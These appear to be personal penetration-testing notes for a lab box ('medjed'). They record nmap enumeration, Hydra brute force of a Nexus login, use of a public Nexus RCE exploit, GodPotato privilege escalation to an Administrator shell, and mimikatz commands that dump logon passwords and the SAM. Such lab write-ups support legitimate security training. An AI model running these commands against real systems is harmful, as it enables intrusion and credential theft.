### Enumeration
```
IP=192.168.170.61
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p21,80,135,139,445,5040,7680,8081,49664,49665,49666,49667,49668,49669 -A $IP
```
### Ports 
- 21
	- Microsoft ftpd
- 80
	- Microsoft IIS httpd 10.0
- 135
	- RPC
- 139
	- RPC
- 445
	- microsoft-ds
- 5040
	- unknown
- 7680
	- pando pub
- 8081
	- Jetty 9.4.18.v20190429
- 49664
	- RPC
- 49665
	- RPC
- 49666
	- RPC
- 49667
	- RPC
- 49668
	- RPC
- 49669
	- RPC
### Foothold
- 21
	- ftp anonymous@$IP
		- Policy requires SSL. login failed
	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
		- [ERROR] all children were disabled due too many connection errors
- RPC/ SMB
	- enum4linux -U $IP
		- nothing
- 445
	- smbclient -N -L //$IP
		- access denied
	- nmap --script smb-vuln* -p135,139,445 $IP
- 80
	- Default landing page
		- ![[Pasted image 20240714130729.png]]
	- Search
		- Searched 123. Put ? in url
		- http://192.168.170.61/?
	- Upload
		- ![[Pasted image 20240714130953.png]]
		- Maybe we can upload malicious package
	- Versions
		- BaGet
	- Directory Brute force
		- dirsearch -u http://$IP
			- nothing
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
- 8081
	- Default landing page
		- ![[Pasted image 20240714131139.png]]
	- Versions
		- Sonatype Nexus Repository Manager OSS 3.21.0-05
			- Googled Nexus Repository Manager OSS 3.21.0-05
				- exploit-db 49385  authenticated
				- Edit the url and the command to be base64 PS1 - gets rce
	- Directory Brute force
		- dirsearch -u http://$IP
			- /robots.txt
				- Disallow: /repository/
					- 404
				- Disallow: /service/
					- 404
		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
		- Found directories
	- Login brute force
		- Capture login request with burp
		- Put into req.txt
		- Create custom wordlist from website
			- cewl http://$IP:8081/ | grep -v CeWL > custom-wordlist.txt
			- cewl --lowercase http://$IP:8081/ | grep -v CeWL  >> custom-wordlist.txt
		- hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.170.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
			- nexus:nexus
			- successful login
### PE
#### Windows
- nathan
	- whoami /all
		- SeImpersonatePrivilege enabled
			- PrintSpoofer64.exe
				- operation failed or timed out
			- God potato
				- Moved nc.exe over to system. Then executed to get shell as Administrator
				- ![[Pasted image 20240714134502.png]]
		- SeCreateGlobalPrivilege enabled
		- SeChangeNotifyPrivilege enabled
	- net user USERNAME
		- Check group memberships
		- nothing
	- systeminfo
		- `./wes.py ~/OSCP/boxes/medjed/systeminfo.txt  > ~/OSCP/boxes/medjed/systeminfo_exploits.txt`
		- windows 10 pro 10.0.18362 N/A Build 18362
		- x64
	- history
		- (Get-PSReadLineOption).HistorySavePath
			- type PATH
			- ![[Pasted image 20240714133818.png]]
	- Users with console
		- nathan
		- BaGet
	- Unquoted
		- cmd
			- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
		- PS1
			- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
		- icacls Filepath before .exe
			- Looking for W or F
	- mimkatz
		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
### Credentials
- nexus:nexus
### Lessons Learned